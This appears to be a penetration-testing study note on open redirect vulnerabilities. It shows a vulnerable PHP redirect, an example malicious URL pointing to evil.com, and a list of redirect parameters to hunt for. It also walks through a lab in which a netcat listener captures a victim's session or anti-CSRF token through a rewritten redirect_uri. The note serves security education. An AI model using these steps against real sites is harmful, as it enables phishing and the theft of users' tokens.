# Open Redirect
Occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality.
- In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim.
- This is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites to which the redirection points.

Let us take a look at some code.
```php
$red = $_GET['url'];
header("Location: " . $red);
```
```php
$red = $_GET['url'];
```
A variable called _red_ is defined that gets its value from a parameter called _url_. 
- _$_GET_ is a PHP superglobal variable that enables us to access the _url_ parameter value.

```php
header("Location: " . $red);
```
- The Location response header indicates the URL to redirect a page to. The line of code above sets the location to the value of _red_, without any validation. We are facing an Open Redirect vulnerability here.

The malicious URL an attacker would send leveraging the Open Redirect vulnerability would look as follows: `trusted.site/index.php?url=https://evil.com`

Make sure you check for the following URL parameters when bug hunting, you'll often see them in login pages. Example: `/login.php?redirect=dashboard`
- ?url=
- ?link=
- ?redirect=
- ?redirecturl=
- ?redirect_uri=
- ?return=
- ?return_to=
- ?returnurl=
- ?go=
- ?goto=
- ?exit=
- ?exitpage=
- ?fromurl=
- ?fromuri=
- ?redirect_to=
- ?next=
- ?newurl=
- ?redir=
## Open Redirect Example
You come across a URL of the below format:
`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

f you enter an email account, you will notice that the application is eventually making a POST request to the page specified in the _redirect_uri_ parameter. A _token_ is also included in the POST request. This token could be a session or anti-CSRF token and, therefore, useful to an attacker.

Let us check if the application performs the redirection without any kind of validation (Open Redirect).

First, let us set up a Netcat listener.
```bash
nc -lvnp 1337
```

Copy the entire URL where you landed after navigating to `oredirect.htb.net`. It should be a URL of the below format:
`http://oredirect.htb.net/?redirect_uri=/complete.html&token=<RANDOM TOKEN ASSIGNED BY THE APP>`

Then, edit this URL as follows.
`http://oredirect.htb.net/?redirect_uri=http://IP-ADDRESS:PORT&token=<RANDOM TOKEN ASSIGNED BY THE APP>`
- `<RANDOM TOKEN ASSIGNED BY THE APP>` <-- Replace this with the token that is assigned automatically by the application.

Open a `New Private Window` and navigate to the link above to simulate the victim.

When the victim enters their email, we notice a connection being made to our listener. The application is indeed vulnerable to Open Redirect. Not only that, but the captured request also includes the token!

# NOTES!
You would still be able to go through with the attack whether it was `GET` or `POST` based.
